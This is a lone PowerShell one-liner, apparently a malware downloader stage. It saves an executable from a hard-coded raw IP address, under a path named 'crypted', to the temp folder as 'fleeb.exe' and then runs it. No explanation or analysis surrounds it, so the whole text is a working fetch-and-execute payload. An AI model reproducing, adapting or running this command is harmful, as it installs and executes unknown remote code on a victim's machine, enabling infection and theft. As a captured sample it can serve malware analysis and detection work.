
($deploylocation=$env:temp+'\fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://31.184.234.74/crypted/1080qw.exe', $deploylocation);Start-Process $deploylocation

